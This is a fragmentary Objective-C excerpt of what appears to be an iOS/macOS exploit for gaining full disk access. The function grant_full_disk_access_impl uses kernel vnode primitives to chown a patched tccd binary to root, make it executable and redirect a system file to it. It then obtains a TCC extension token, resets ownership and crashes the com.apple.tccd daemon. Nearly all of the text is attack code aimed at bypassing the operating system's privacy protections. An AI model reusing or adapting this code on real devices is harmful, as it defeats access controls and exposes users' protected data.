...
static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
    ...
    NSString *patchedPath = [NSString stringWithFormat:@"%@%@", [[NSBundle mainBundle] bundlePath], @"/tccd_patched"];
//    if(access(patchedPath.UTF8String, F_OK) == 0) remove(patchedPath.UTF8String);
//    if(![sourceData writeToFile:patchedPath atomically:YES]) {
//        completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
//                                            code:5
//                                        userInfo:@{NSLocalizedDescriptionKey : @"Failed to save tccd_patched"}]);
//        return;
//    }
    
//    funVnodeOverwriteFile("/System/Library/PrivateFrameworks/TextRecognition.framework/fr_FR.lm", patchedPath.UTF8String); //hmmm....
//    patchedPath = @"/System/Library/PrivateFrameworks/TextRecognition.framework/fr_FR.lm";
    
    funVnodeChmod(patchedPath.UTF8String, 0100755);
    funVnodeChown(patchedPath.UTF8String, 0, 0);
    
    uint64_t orig_to_vnode = 0;
    uint64_t orig_nc_vp = 0;
    if(funVnodeRedirectFile(targetPath, patchedPath.UTF8String, &orig_to_vnode, &orig_nc_vp) == -1){
...
//        overwrite_file(fd, originalData);
    ...
    call_tccd(^(NSString* _Nullable extension_token) {
        ...
        funVnodeChmod(patchedPath.UTF8String, 0644);
        funVnodeChown(patchedPath.UTF8String, 501, 501);
//        overwrite_file(fd, originalData);
        xpc_crasher("com.apple.tccd");
